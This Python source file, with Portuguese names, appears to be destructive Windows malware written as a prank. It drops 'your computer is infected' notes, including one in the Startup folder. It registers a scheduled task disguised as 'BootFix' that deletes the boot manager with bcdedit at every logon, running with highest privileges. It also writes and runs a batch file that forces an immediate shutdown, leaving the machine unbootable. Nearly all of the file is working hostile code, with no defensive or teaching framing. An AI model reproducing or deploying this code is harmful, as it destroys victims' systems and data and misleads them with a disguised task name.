import os
import time

class Texto:

    def criar_e_executar_texto():
        diretorio = os.getcwd()
        caminho = os.path.join(diretorio, 'texto.txt')

        text = r'''
            Your computer is infected.
            Remember, it was your own choice.
        '''

        with open(caminho, 'w', encoding="utf-8-sig") as file:
            file.write(text)

        os.system(f'start ' + caminho)

    def texto_inicial():
        user = os.getlogin()
        caminho = os.path.join('C:\\', 'Users', user, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'end.txt')

        comando = r'''
            Hello again.
            
            Yes, you didn't read it wrong, your computer is now infected.
            
            >>> DO NOT TRY TO RESTART OR TURN OFF YOUR PC! <<<

            Or your pc won't boot anymore, so i'd recommend you to just enjoy your last moments with your PC.

            And do not forget, it was all your own choice...
        '''

        with open(caminho, 'w', encoding="utf-8-sig") as file:
            file.write(comando)

class Tarefa:

    def __init__(self):
        self.nome = 'BootFix'
        self.comando = r'bcdedit /delete {bootmgr} /f'
        self.programa = f'cmd.exe /c {self.comando}'

    def criar_tarefa(self):
        os.system(f'schtasks /create /tn "{self.nome}" /tr "{self.programa}" /sc onlogon /rl highest /f')

class Operacoes:

    def desligarPc():
        comando = 'shutdown /f /t 0'
        diretorio = os.path.join(os.getcwd(), 'out.bat')

        with open(diretorio, 'w') as file:
            file.write(comando)

        time.sleep(10)

        os.system('start ' + diretorio)